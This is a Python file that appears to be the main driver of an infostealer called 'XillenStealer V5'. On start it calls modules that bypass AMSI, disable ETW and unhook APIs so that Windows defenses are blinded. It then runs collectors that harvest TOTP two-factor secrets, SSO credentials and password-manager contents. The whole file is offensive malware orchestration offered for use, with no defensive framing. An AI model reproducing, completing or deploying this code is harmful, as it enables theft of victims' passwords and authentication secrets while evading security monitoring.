import sys
import os

sys.path.insert(0, os.path.dirname(__file__))

from core.evasion.amsi_killer import AMSIBypass
from core.evasion.etw_disabler import ETWDisabler
from core.evasion.unhooker import APIUnhooker
from core.evasion.process_injection import ProcessInjector
from core.collectors.totp_collector import TOTPCollector
from core.collectors.sso_collector import SSOCollector
from core.collectors.password_managers import PasswordManagersCollector
from core.utils.logger import Logger

class XillenStealerV5:
    def __init__(self):
        self.logger = Logger()
        self.logger.info("XillenStealer V5.0 Started")
        self.init_evasion()
        
    def init_evasion(self):
        try:
            amsi = AMSIBypass()
            amsi.bypass_amsi()
            self.logger.info("AMSI bypassed")
            
            etw = ETWDisabler()
            etw.disable_etw()
            self.logger.info("ETW disabled")
            
            unhooker = APIUnhooker()
            unhooker.unhook_all()
            self.logger.info("API unhooked")
        except Exception as e:
            self.logger.error(f"Evasion failed: {e}")
    
    def collect_all(self):
        all_data = {}
        
        try:
            totp = TOTPCollector()
            all_data['totp'] = totp.collect_totp()
            self.logger.info("TOTP collected")
        except Exception as e:
            self.logger.error(f"TOTP collection failed: {e}")
        
        try:
            sso = SSOCollector()
            all_data['sso'] = sso.collect_sso()
            self.logger.info("SSO collected")
        except Exception as e:
            self.logger.error(f"SSO collection failed: {e}")
        
        try:
            pm = PasswordManagersCollector()
            all_data['password_managers'] = pm.collect_passwords()
            self.logger.info("Password managers collected")
        except Exception as e:
            self.logger.error(f"Password managers collection failed: {e}")
        
        return all_data
    
    def run(self):
        data = self.collect_all()
        self.logger.info(f"Collection complete. Data keys: {list(data.keys())}")
        return data

if __name__ == "__main__":
    stealer = XillenStealerV5()
    stealer.run()

